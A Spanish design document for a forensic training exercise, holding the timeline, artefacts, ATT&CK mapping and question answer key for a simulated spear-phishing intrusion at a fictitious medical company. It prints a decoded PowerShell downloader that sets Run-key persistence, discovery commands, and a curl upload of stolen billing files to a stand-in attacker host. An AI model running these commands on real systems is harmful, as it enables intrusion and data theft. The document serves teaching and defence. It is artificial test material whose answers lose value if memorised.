---
tags:
  - DFIR/Simulacion
  - DFIR/Windows
  - DFIR/Email
estado: borrador fase 1
---

# Diseño — Escenario 03: spear phishing contra facturación

Este documento de trabajo contiene las respuestas, así que no se entrega a quien vaya a resolver el caso. El generador se rige por él: todo lo que aparezca en las evidencias tiene que salir de esta línea temporal, y nada que no esté aquí debería aparecer.

## Premisa

Laboratorios Ardeal es el laboratorio externo que procesa las analíticas de Kelbrook Medical. Cada mes manda su factura desde `administracion@ardeal-labs.net`, firmada por Javier Ruiz Ortega, de su departamento de administración. En Kelbrook la recibe y la concilia Lucía Marín, de facturación. Las dos cosas son públicas: Ardeal cita a Kelbrook como cliente en su web y Lucía tiene su puesto en LinkedIn.

El atacante registra `ardeal-lab.net` (sin la «s») y monta en un VPS su propio servidor de correo con SPF, DKIM y DMARC bien configurados. Escribe a Lucía por su nombre, cita la conciliación de septiembre y copia la firma de Javier Ruiz. Adjunta un ZIP con un acceso directo que se hace pasar por la factura en PDF.

Lucía no tiene permisos de administrador. Al atacante no le hacen falta: persiste en HKCU, enumera el dominio con herramientas nativas y se lleva las remesas de septiembre del recurso compartido de facturación, al que Lucía tiene acceso de lectura.

La dificultad es **fácil**. Todo se ve en Sysmon y casi cada paso tiene una segunda fuente que lo confirma. El reto está en saber dónde mirar y en no confundir el ruido, o la actividad del equipo de IT, con el ataque.

## Activos

| Activo | IP | Rol |
| --- | --- | --- |
| `KB-FIN-WS03.kelbrook.internal` | `10.20.30.61` | Puesto de Lucía. Windows 11 Pro 24H2 (build 26100), unido al dominio `KELBROOK`, con Sysmon 15. **Víctima** |
| `dc01` | `10.20.30.3` | Controlador de dominio y DNS de los puestos (reenvía a `dns01`) |
| `fs01` | `10.20.30.45` | Servidor de ficheros. Recurso `\\fs01\Facturacion` |
| `fw01` | `10.20.30.1` | Cortafuegos y puerta de enlace |
| Correo | — | Exchange Online. MX `kelbrookmedical-net.mail.protection.outlook.com` |
| `mail.ardeal-lab.net` | `198.51.100.89` | Servidor de correo del atacante en un VPS (Postfix) |
| Cliente de correo del atacante | `203.0.113.201` | IP desde la que el atacante se autentica en su Postfix para enviar. Aparece en la primera cabecera `Received` |
| `cdn.ardeal-lab.net` | `203.0.113.58` | Descarga de la segunda fase, mando y control por HTTPS y receptor de la exfiltración |
| `ardeal-labs.net` | — | Dominio **real** del proveedor, alojado en Microsoft 365. Solo aparece en el correo legítimo de referencia y en la navegación de Lucía |

Cuentas:

| Cuenta | SID (RID) | Notas |
| --- | --- | --- |
| `KELBROOK\lmarin` | `S-1-5-21-3021476520-1873542967-2461890375-1108` | Lucía Marín, facturación. Usuaria estándar, sin administración local |
| `KELBROOK\adm.jtorres` | `…-1115` | Jorge Torres, técnico de IT. Cuenta de administración de puestos; su perfil existe en el equipo desde la instalación (marzo de 2026) |

Configuración relevante del puesto:

- **Sysmon 15.15**, con configuración basada en la de Olaf Hartong. Las reglas rellenan `RuleName` con `technique_id=...,technique_name=...`. Registra:
  - 1 (creación de proceso) y 5 (fin de proceso);
  - 3 (red), solo para LOLBins, PowerShell, `curl` y procesos que corran desde `\AppData\`, `\Temp\` o `\Users\Public\`;
  - 11 (fichero creado), 13 (valor de registro), 15 (ADS `Zone.Identifier`) y 22 (DNS);
  - 26 (borrado de ficheros comprimidos y ejecutables en carpetas temporales) y 29 (ejecutable nuevo detectado).
- **Auditoría por GPO.** Está activado 4688 con línea de comandos, y también el inicio y cierre de sesión (4624, 4634, 4647, 4672) y el bloqueo y desbloqueo (4800, 4801).
- **PowerShell.** El *Script Block Logging* (4104) está activado por GPO; la transcripción, no.
- **Defender antivirus**, con firmas al día. No detecta el implante, que es de compilación propia.
- **Sin EDR.** IT aísla el equipo desenchufando el cable.
- **Zona horaria `Romance Standard Time`** (CEST, UTC+2 en octubre). Los EVTX, el registro, el Prefetch y el historial de Edge guardan UTC.

## Línea temporal

Las horas van en **UTC**, con la hora local entre paréntesis cuando ayuda. El día del ataque es el **martes 13/10/2026**.

### Días anteriores (ruido de fondo, 05/10 → 12/10)

| Fecha | Evento | Dónde se ve |
| --- | --- | --- |
| Días laborables | El equipo arranca entre 06:35 y 06:50 y Lucía inicia sesión. Se apaga entre 15:30 y 16:10 | Security 4624/4634/4647, System 6005/6006/12/13 |
| 05/10 08:02 | **Correo legítimo** de Ardeal con la factura ARD-2026-0884 de agosto. Lucía abre el PDF adjunto desde Outlook, que lo guarda en la misma carpeta `Content.Outlook\K7Q2ZP1M\` | `.eml` de referencia, LNK en Recent, Edge (visita `file:///`) |
| 06/10 – 09/10 | Excel y PDF del recurso `\\fs01\Facturacion`, Teams, Outlook y navegación (intranet, banca, AEAT) | Recent LNK, Prefetch, historial de Edge |
| 08/10 13:10 | Actualización acumulativa de Windows y reinicio | System (WindowsUpdateClient 19/43/44, 1074, 6006/6005), SOFTWARE (UBR) |
| A diario | Actualización de firmas de Defender, escaneo rápido programado, OneDrive y tareas programadas | Defender 2000/1000/1001, Sysmon, Prefetch |
| 12/10 ~09:00 | El log de Sysmon (64 MB) se llena y empieza a sobrescribir lo más antiguo. Su primer registro es de esa mañana; Security, System y el resto conservan desde el 05/10 | Primer registro de cada EVTX |

### 13/10, día del ataque

| UTC (local) | Evento | Dónde se ve |
| --- | --- | --- |
| 06:41:07 (08:41) | Arranque del equipo | System 12/6005/6009, Sysmon (procesos de arranque) |
| 06:43:52 (08:43) | Lucía inicia sesión (tipo 2, Kerberos) | Security 4624, Sysmon 1 (`userinit`, `explorer`) |
| 06:44 – 06:47 | OneDrive (Run legítimo), Teams, Outlook y Edge | Sysmon 1, Prefetch |
| 07:02:30 (09:02) | Lucía abre `\\fs01\Facturacion\Conciliaciones\Conciliacion_Ardeal_2026-09.xlsx`. Es acceso **legítimo** a `fs01`, y sirve de contraste con el del atacante | Sysmon 1 (EXCEL con la ruta UNC en la línea de comandos), Recent LNK, RecentDocs |
| 07:14:22 (09:14) | Exchange Online recibe el correo malicioso | `.eml` (cabeceras `Received`) |
| 07:31:05 (09:31) | Lucía abre el adjunto. Outlook guarda `Factura_ARD-2026-0917.zip` en `INetCache\Content.Outlook\K7Q2ZP1M\` con `Zone.Identifier` ZoneId=3 y el Explorador abre el ZIP | Sysmon 11 y 15 (OUTLOOK.EXE), NTUSER `OutlookSecureTempFolder`, Recent `Factura_ARD-2026-0917.zip.lnk`, RecentDocs `.zip` |
| 07:31:19 | Doble clic en `Factura_ARD-2026-0917.pdf.lnk`. El Explorador lo extrae a `%TEMP%\Temp1_Factura_ARD-2026-0917.zip\` y lo ejecuta | Sysmon 11 (explorer.exe) |
| 07:31:19 | `powershell.exe -w hidden -nop -ep bypass -enc <base64>`, con explorer.exe como padre | Sysmon 1, Security 4688, Windows PowerShell 400/600 (`HostApplication`), PowerShell/Operational 4104 con el script decodificado |
| 07:31:20 | Resolución DNS de `cdn.ardeal-lab.net` a `203.0.113.58` y conexión a 443 | Sysmon 22 y 3 (powershell.exe) |
| 07:31:21 | Descarga del señuelo `%TEMP%\ARD-2026-0917.pdf` | Sysmon 11 |
| 07:31:22 | `Start-Process` del PDF, que abre Edge (msedge.exe `--single-argument ...pdf`) | Sysmon 1 (padre powershell.exe), historial de Edge (`file:///C:/Users/lmarin/AppData/Local/Temp/ARD-2026-0917.pdf`) |
| 07:31:24 | Descarga del implante a `%LOCALAPPDATA%\Microsoft\OneDrive\Update\OneDriveUpdater.exe` | Sysmon 11 y 29 (con hashes) |
| 07:31:25 | Valor `OneDrive Updater` en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Sysmon 13, NTUSER.DAT (valor y LastWrite de la clave), 4104 |
| 07:31:25 | Arranca `OneDriveUpdater.exe`, con powershell.exe como padre | Sysmon 1 (`OriginalFileName` `rtagent.exe`, sin `Company`), 4688, Amcache (SHA-1, sin editor), Prefetch |
| 07:31:26 | Termina PowerShell | Sysmon 5 |
| 07:31:27 → 09:52 | Beacon HTTPS a `cdn.ardeal-lab.net:443` cada 60 s, con un ±10 % de variación. DNS cada ~5 min, cuando caduca el TTL | Sysmon 3 (unos 140) y 22 (OneDriveUpdater.exe) |
| 08:20:10 – 08:34:40 | Lucía bloquea el equipo para el café y lo desbloquea. Los beacons siguen | Security 4800/4801, 4624 tipo 7 |
| 08:48:12 | `cmd.exe /C whoami /all` | Sysmon 1 (padre OneDriveUpdater.exe), 4688, Prefetch `CMD.EXE`/`WHOAMI.EXE` |
| 08:48:40 | `cmd.exe /C ipconfig /all` | Igual, Prefetch `IPCONFIG.EXE` |
| 08:49:15 | `cmd.exe /C net user lmarin /domain` (net.exe → net1.exe) | Sysmon 1, 4688, Prefetch `NET.EXE`/`NET1.EXE` |
| 08:50:02 | `cmd.exe /C net group "Domain Admins" /domain` | Ídem |
| 08:50:40 | `cmd.exe /C nltest /dclist:kelbrook.internal` | Sysmon 1, 4688, Prefetch `NLTEST.EXE` |
| 08:52:10 | `cmd.exe /C net view \\fs01` | Sysmon 1, 4688 |
| 08:53:30 | `cmd.exe /C dir \\fs01\Facturacion` | Sysmon 1, 4688 |
| 08:55:05 | `cmd.exe /C dir \\fs01\Facturacion\Remesas\2026-09` | Sysmon 1, 4688 |
| 09:02:05 | `cmd.exe /C tar.exe -a -c -f C:\Users\lmarin\AppData\Local\Temp\rm0926.zip -C \\fs01\Facturacion\Remesas 2026-09` | Sysmon 1, 4688, Sysmon 11 (`rm0926.zip`), Prefetch `TAR.EXE`, cuya lista de ficheros incluye los seis ficheros de la carpeta como `\DEVICE\MUP\FS01\FACTURACION\REMESAS\2026-09\...` |
| 09:04:31 | `cmd.exe /C curl.exe -s -k -F "f=@C:\Users\lmarin\AppData\Local\Temp\rm0926.zip" https://cdn.ardeal-lab.net/u` | Sysmon 1, 3 y 22 (curl.exe), 4688, Prefetch `CURL.EXE` |
| 09:06:10 | `cmd.exe /C del C:\Users\lmarin\AppData\Local\Temp\rm0926.zip` | Sysmon 1 y 26 |
| 09:18:40 (11:18) | Lucía busca en Edge «laboratorios ardeal teléfono administración» y entra en `ardeal-labs.net/contacto` porque «la factura no se abría». Llama y le dicen que no han enviado nada | Historial de Edge |
| 09:41 (11:41) | Abre un ticket a IT | Fuera de las evidencias (brief) |
| 09:52:33 (11:52) | IT desenchufa el cable de red | System 27 (driver Intel I219-LM, *link is disconnected*), NCSI. Desde ahí los Sysmon 22 de OneDriveUpdater.exe registran fallos y desaparecen los Sysmon 3 |
| 10:06:15 (12:06) | Jorge Torres cambia de usuario e inicia sesión como `adm.jtorres` (tipo 2). La sesión de Lucía queda abierta | Security 4624 y 4672 |
| 10:08:40 | Pincha un USB SanDisk Cruzer, montado como `E:` | SYSTEM: `USBSTOR`, `MountedDevices` |
| 10:10:15 (12:10) | Lanza `E:\KAPE\kape.exe --tsource C: --tdest E:\triage\KB-FIN-WS03 --target KB-Triage` como administrador | Sysmon 1, 4688, Prefetch `KAPE.EXE`, Amcache (ruta en `E:`), ConsoleLog de KAPE |
| 10:10:16 → 10:13:50 | KAPE copia los artefactos. Cada EVTX acaba en el último registro anterior a su copia, y la propia recogida aparece en los que se copian más tarde | Últimos registros de cada EVTX, CopyLog |

### Qué pasa después (fuera de las evidencias)

El implante sigue vivo pero sin red. IT comprimirá en su equipo la carpeta de KAPE como `KB-FIN-WS03_triage.zip`.

## Contenido del correo malicioso

- **Cabeceras de envío:**
  - `From: "Administración Laboratorios Ardeal" <administracion@ardeal-lab.net>`, `To: Lucía Marín <lmarin@kelbrook-medical.net>`.
  - `Subject: Factura rectificativa ARD-2026-0917 - conciliación septiembre` y `Date: Tue, 13 Oct 2026 09:14:18 +0200`.
  - `Message-ID: <20261013071418.4F1A2C0D3E@mail.ardeal-lab.net>`, con formato de cola de Postfix, y `User-Agent: Mozilla Thunderbird`.
- **Cadena `Received`, de abajo arriba:**
  - `from [192.168.1.37] (unknown [203.0.113.201]) by mail.ardeal-lab.net (Postfix) with ESMTPSA id 4F1A2C0D3E`;
  - `from mail.ardeal-lab.net (198.51.100.89) by AM4PEPF00027A6C.mail.protection.outlook.com`;
  - y los saltos internos de Exchange Online.
- **Autenticación:** `Authentication-Results` con `spf=pass (sender IP is 198.51.100.89) smtp.mailfrom=ardeal-lab.net; dkim=pass (signature was verified) header.d=ardeal-lab.net; dmarc=pass action=none header.from=ardeal-lab.net; compauth=pass reason=100`. `X-MS-Exchange-Organization-SCL: 1`.
- **Cuerpo (texto y HTML):**

  > Buenos días, Lucía:
  >
  > Tal y como comentamos en la conciliación, le adjunto la factura rectificativa ARD-2026-0917 correspondiente a las analíticas de septiembre, con el ajuste aplicado. Le agradecería que la revisara antes del cierre del jueves.
  >
  > Un saludo,
  > Javier Ruiz Ortega · Administración · Laboratorios Ardeal

  La firma copia la del correo legítimo, pero el teléfono tiene un dígito cambiado.
- **Adjunto:** `Factura_ARD-2026-0917.zip`, que contiene solo `Factura_ARD-2026-0917.pdf.lnk`. Las fechas del ZIP son del 12/10.

El correo legítimo de referencia (05/10) sale del tenant de Microsoft 365 de Ardeal:
- Su cadena `Received` es interna de `*.prod.outlook.com` y no tiene ningún salto por Postfix.
- Lleva `DKIM-Signature` con `s=selector1` y `d=ardeal-labs.net`.
- Lleva `X-MS-Exchange-CrossTenant-*` y `Message-ID` de Outlook (`<AM9PR04MB...@AM9PR04MB....eurprd04.prod.outlook.com>`).
- Adjunta un PDF de verdad, `Factura_ARD-2026-0884.pdf`, que es un PDF mínimo con el texto de la factura.

## El acceso directo

- **Destino y argumentos:** el destino es `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` y los argumentos son `-w hidden -nop -ep bypass -enc <UTF-16LE en Base64>`.
- **Apariencia:** `ShowCommand` SW_SHOWMINNOACTIVE (7). El icono es `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` con el índice del icono de PDF. La descripción es `Factura ARD-2026-0917`.
- **Script decodificado:**
  ```powershell
  $u='https://cdn.ardeal-lab.net/d/';$d="$env:LOCALAPPDATA\Microsoft\OneDrive\Update"
  iwr ($u+'ARD-2026-0917.pdf') -UseBasicParsing -OutFile "$env:TEMP\ARD-2026-0917.pdf"
  Start-Process "$env:TEMP\ARD-2026-0917.pdf"
  New-Item -ItemType Directory -Force -Path $d | Out-Null
  iwr ($u+'odu.bin') -UseBasicParsing -OutFile "$d\OneDriveUpdater.exe"
  New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDrive Updater' -Value "$d\OneDriveUpdater.exe" -Force | Out-Null
  Start-Process "$d\OneDriveUpdater.exe"
  ```
- **Bloque `TrackerDataBlock`:** delata el equipo donde se creó el LNK. El `MachineID` es `desktop-r4k9t2m` y la MAC de los *droid* GUID es `08:00:27:5e:a1:3c`, que pertenece al OUI de VirtualBox. Las marcas de tiempo del destino son las de `powershell.exe` en esa máquina.

El LNK es inerte fuera del escenario: apunta a un dominio inventado que resuelve a IPs de documentación.

## El implante

No se entrega: no existe ningún binario. Solo existen sus rastros, generados a partir de un buffer ficticio del que se calculan los hashes, siempre los mismos.

| Campo | Valor |
| --- | --- |
| Ruta | `C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\Update\OneDriveUpdater.exe` |
| Tamaño | 412 160 bytes |
| `OriginalFileName` / `Description` | `rtagent.exe` / `Runtime Agent` |
| `Company` / `Product` | vacío / `OneDrive Updater` |
| Fecha de enlazado (PE) | 2026-09-28 |
| Hashes | SHA-1 (Amcache), MD5, SHA-256 e IMPHASH (Sysmon 1 y 29), coherentes entre sí |

Para comparar están el OneDrive legítimo y su actualizador en Amcache y Prefetch:
- `%LOCALAPPDATA%\Microsoft\OneDrive\OneDrive.exe`;
- `%LOCALAPPDATA%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe`, lanzado por la tarea programada de OneDrive.

Los dos tienen editor `Microsoft Corporation`. El actualizador real no está en `Update\` ni se arranca desde una clave Run.

## Datos exfiltrados

`\\fs01\Facturacion\Remesas\2026-09\` contiene las remesas SEPA de recibos domiciliados de pacientes con planes de pago (nombre, DNI e IBAN):

```
remesa_2026-09-05.xml   remesa_2026-09-12.xml   remesa_2026-09-19.xml
remesa_2026-09-26.xml   resumen_remesas_2026-09.xlsx   devoluciones_2026-09.xlsx
```

Los nombres solo se ven en la lista de ficheros del Prefetch de `TAR.EXE`. El brief describe el contenido de la carpeta en la tabla de activos, para que se pueda responder a la pregunta sobre el RGPD.

## Mapa ATT&CK

| Fase | Técnica | Evidencia |
| --- | --- | --- |
| Acceso inicial | T1566.001 Phishing: Spearphishing Attachment | `.eml` |
| Recursos | T1583.001 Acquire Infrastructure: Domains | `ardeal-lab.net` frente a `ardeal-labs.net` |
| Ejecución | T1204.002 User Execution: Malicious File | Sysmon 1, explorer.exe → powershell.exe |
| Ejecución | T1059.001 Command and Scripting Interpreter: PowerShell | Sysmon 1, 4104, 400 |
| Ejecución | T1059.003 Windows Command Shell | `cmd.exe /C` hijos del implante |
| Evasión | T1036.007 Masquerading: Double File Extension | `.pdf.lnk` |
| Evasión | T1036.005 Masquerading: Match Legitimate Resource Name or Location | `OneDrive\Update\OneDriveUpdater.exe` |
| Evasión | T1027.010 Obfuscated Files or Information: Command Obfuscation | `-enc` |
| Evasión | T1070.004 Indicator Removal: File Deletion | `del rm0926.zip`, Sysmon 26 |
| Transferencia | T1105 Ingress Tool Transfer | `iwr` de `odu.bin` |
| Persistencia | T1547.001 Boot or Logon Autostart Execution: Registry Run Keys | HKCU Run `OneDrive Updater` |
| C2 | T1071.001 Application Layer Protocol: Web Protocols | Beacons HTTPS |
| Descubrimiento | T1033, T1016, T1087.002, T1069.002, T1018, T1135, T1083 | whoami, ipconfig, net user, net group, nltest, net view, dir |
| Recolección | T1039 Data from Network Shared Drive, T1560.001 Archive via Utility | `tar.exe` sobre `\\fs01` |
| Exfiltración | T1041 Exfiltration Over C2 Channel | `curl` a `cdn.ardeal-lab.net/u`, el mismo servidor de C2 |

## Evidencias que se entregan

```
03_Windows_Phishing/
├── Escenario.md
├── Solucion.md
├── generar_escenario.py
├── correo/
│   ├── reportado_Factura_rectificativa_ARD-2026-0917.eml
│   └── referencia_Factura_ARD-2026-0884.eml
└── triage/
    └── KB-FIN-WS03_triage.zip
```

Contenido del ZIP de triage, que reproduce la estructura de salida de KAPE con los timestamps originales:

```
KB-FIN-WS03/
├── <timestamp UTC>_ConsoleLog.txt
├── <timestamp UTC>_CopyLog.csv          (origen, destino, tamaño, SHA-1, MACB)
└── C/
    ├── Windows/System32/winevt/Logs/
    │   ├── Security.evtx
    │   ├── System.evtx
    │   ├── Application.evtx
    │   ├── Microsoft-Windows-Sysmon%4Operational.evtx
    │   ├── Microsoft-Windows-PowerShell%4Operational.evtx
    │   ├── Windows PowerShell.evtx
    │   └── Microsoft-Windows-Windows Defender%4Operational.evtx
    ├── Windows/System32/config/   SYSTEM  SOFTWARE  (+ .LOG1/.LOG2)
    ├── Windows/appcompat/Programs/Amcache.hve
    ├── Windows/Prefetch/*.pf
    └── Users/
        ├── lmarin/
        │   ├── NTUSER.DAT
        │   ├── AppData/Roaming/Microsoft/Windows/Recent/*.lnk
        │   └── AppData/Local/Microsoft/Edge/User Data/Default/History
        └── adm.jtorres/
            ├── NTUSER.DAT
            └── AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
```

IT usó un target propio, `KB-Triage.tkape`, que el ConsoleLog cita y que limita la recogida a lo de arriba. Por eso no hay $MFT, $UsnJrnl, jump lists, SRUM, UsrClass.dat ni memoria. Es una decisión deliberada para mantener el escenario en dificultad fácil y que esté a nuestro alcance generar bien cada formato.

## Trampas pensadas

1. **SPF, DKIM y DMARC en *pass*.** Autentican el dominio del remitente, no su legitimidad: el atacante es dueño de `ardeal-lab.net`. Lo que delata el engaño es la diferencia de dominio y el origen (un VPS con Postfix frente al tenant de M365 del proveedor).
2. **UTC frente a hora local.** El `Date:` del correo va en +0200 y los `Received` de Exchange en +0000. EVTX, registro, Prefetch y Edge van en UTC, y el ticket y el relato de Lucía en hora local. Quien mezcle las dos se desplaza dos horas.
3. **El falso OneDrive.** El OneDrive legítimo tiene su propia entrada Run y su actualizador real está en Amcache y Prefetch. Hay que comparar ruta, editor, padre y mecanismo de arranque, no fijarse solo en el nombre.
4. **El PDF señuelo.** Edge abre un PDF y queda en el historial. No es el malware; sirve para que Lucía crea que «la factura no se abría bien».
5. **Dos accesos a `fs01`.** Lucía abre la conciliación a las 07:02 desde Excel y el atacante lista y empaqueta las remesas desde `cmd.exe`, hijo del implante. Cuenta el proceso padre, no la ruta.
6. **El equipo de IT.** El inicio de sesión de `adm.jtorres`, el USB, `kape.exe` y su Prefetch y Amcache son de la respuesta. El historial de PowerShell que hay en el triage es de Jorge (comandos de soporte antiguos), no del atacante.
7. **El historial de PowerShell.** Quien busque el ataque en `ConsoleHost_history.txt` no lo encontrará: `-enc` en una sesión no interactiva no escribe ahí. Lucía ni siquiera tiene ese fichero. La fuente es el 4104 o el 400.
8. **«Windows 10 Pro».** `SOFTWARE\...\CurrentVersion\ProductName` dice Windows 10 aunque el equipo es Windows 11. Es un comportamiento real de Windows y hay que fiarse de `CurrentBuild` (26100).

## Preguntas (borrador, 15 + 2)

Se copian a `Escenario.md`. La respuesta esperada va entre paréntesis y solo aquí.

1. ¿Qué dirección de remitente usa el correo malicioso y en qué se diferencia del dominio real del proveedor? (`administracion@ardeal-lab.net`; falta la «s» de `ardeal-labs.net`)
2. SPF, DKIM y DMARC dan *pass*. ¿Por qué eso no demuestra que el correo sea legítimo? Señala al menos dos diferencias de cabeceras con el correo legítimo de referencia. (Autentican el dominio del atacante. Sale de un Postfix en un VPS y no de M365; Thunderbird; Message-ID de Postfix; DKIM con `d=ardeal-lab.net`; no hay cabeceras CrossTenant)
3. ¿Desde qué IP pública se conectó el remitente a su servidor de correo para enviarlo? (`203.0.113.201`, en el primer `Received`; `192.168.1.37` es su IP privada)
4. ¿Qué contiene en realidad el adjunto y qué truco usa para pasar por un PDF? (Un ZIP con un `.pdf.lnk`. Windows oculta la extensión `.lnk` y el icono es el de PDF de Edge)
5. ¿Qué ejecuta el acceso directo? Decodifica el comando y resume paso a paso lo que hace. (PowerShell `-enc`: descarga el señuelo y lo abre, descarga el implante, crea la entrada Run y lo lanza)
6. ¿A qué hora (UTC) abrió Lucía el adjunto y en qué carpeta lo dejó Outlook? (07:31:05; `INetCache\Content.Outlook\K7Q2ZP1M\`, confirmado por Sysmon 11/15 y `OutlookSecureTempFolder`)
7. ¿Qué proceso lanzó PowerShell y desde qué ruta se ejecutó realmente el acceso directo? (explorer.exe; `%TEMP%\Temp1_Factura_ARD-2026-0917.zip\`)
8. ¿Qué ejecutable se instaló, en qué ruta, con qué SHA-256 y a qué hora se ejecutó por primera vez? (`OneDriveUpdater.exe`, 07:31:25)
9. El nombre y la ruta imitan a OneDrive. ¿Qué datos de las evidencias demuestran que no es software de Microsoft? (Sin editor en Amcache, `OriginalFileName` `rtagent.exe`, padre powershell.exe, fuera de la ruta del actualizador real, arranque por Run en vez de por la tarea de OneDrive)
10. ¿Qué mecanismo de persistencia dejó y dónde lo encuentras en el registro? (HKCU\...\Run, valor `OneDrive Updater`, en el NTUSER.DAT de `lmarin`; Sysmon 13)
11. ¿Con qué dominio e IP se comunica el implante y cada cuánto? (`cdn.ardeal-lab.net`, `203.0.113.58:443`, ~60 s)
12. Enumera en orden, con hora UTC, los comandos que lanzó el operador a través del implante. ¿Qué buscaba? (Los ocho de 08:48 a 08:55: identidad, red, administradores del dominio, DC y recursos de `fs01`)
13. ¿Qué datos se llevó, cómo los empaquetó, por dónde los sacó y qué hizo después con el fichero? (`\\fs01\Facturacion\Remesas\2026-09`, `tar.exe` → `rm0926.zip`, `curl` POST a `https://cdn.ardeal-lab.net/u`, `del`)
14. ¿Qué actividad de las evidencias corresponde al equipo de IT y no al atacante? (`adm.jtorres` 10:06:15, USB, `kape.exe` 10:10:15, el corte de red de 09:52:33)
15. ¿En qué zona horaria está configurado el equipo y a qué hora local abrió Lucía el adjunto? (`Romance Standard Time`, UTC+2 en octubre; 09:31:05)

### Extra (difícil)

16. Los metadatos del acceso directo delatan el equipo donde se creó. ¿Qué nombre de máquina y qué MAC aparecen, y qué te dice esa MAC? (`desktop-r4k9t2m`, `08:00:27:5e:a1:3c`: VirtualBox)
17. Sin acceso a `fs01`, ¿qué ficheros concretos se llevó? (Los seis de la lista de ficheros del Prefetch de `TAR.EXE`)

Entregable sugerido:
- línea temporal en UTC que separe atacante, usuaria e IT;
- IOCs (dominios, IPs, hashes, ruta, valor Run);
- acciones de contención y erradicación;
- valoración de si hay que notificar a la AEPD (remesas con datos de pacientes);
- tres recomendaciones.

## Decisiones abiertas para revisar antes de la fase 2

- **EVTX.** Lo escribo yo:
  - cabecera de fichero, chunks de 64 KB, tablas de cadenas y plantillas, BinXML con *template instances* y CRC32 de cabecera y datos;
  - proveedores con su nombre y GUID reales (Security-Auditing, Sysmon, PowerShell, Eventlog, Kernel-General…), para que el Visor de eventos renderice los mensajes si el proveedor está instalado;
  - se valida con libevtx, el crate Rust `evtx` y python-evtx.
- **Volumen.** Sysmon de un puesto real genera miles de eventos al día. Calculo unos 8 000 a 12 000 en total entre todos los logs, y la semana de ruido de Security, System y Application con un patrón diario creíble.
- **Prefetch.** Formato de Windows 11 (versión 30 u otra, la que documente libscca para la build 26100), comprimido con MAM (LZXPRESS Huffman) y con el hash de ruta de Windows. Se valida con libscca.
- **Registro.** Colmenas regf limpias, con secuencias primaria y secundaria iguales y `.LOG1` y `.LOG2` mínimos. Se validan con libregf y regipy. Amcache lleva un subconjunto creíble de `InventoryApplicationFile`, de unas 40 entradas.
- **Cabeceras de M365.** Los saltos internos de Microsoft usan IPv6. Para respetar la regla de direcciones de documentación van en `2001:db8::/32`, y los nombres de host siguen el formato real (`*.prod.outlook.com`).
- **Sin red.** No hay PCAP ni logs de cortafuegos o proxy, y la red se ve solo desde el host (Sysmon 3 y 22). Si en la validación se queda corto, se puede añadir un CSV del cortafuegos.
- **Sin `fs01`.** No hay evidencias del servidor de ficheros. La exfiltración se reconstruye con la línea de comandos y el Prefetch de `tar.exe`.
- **Validación con herramientas de Windows.** Las EZ Tools (EvtxECmd, RECmd, PECmd, LECmd, AmcacheParser) y Hayabusa no se descargan desde este contenedor. En la fase 3 se te pedirá probar el ZIP en tu máquina.
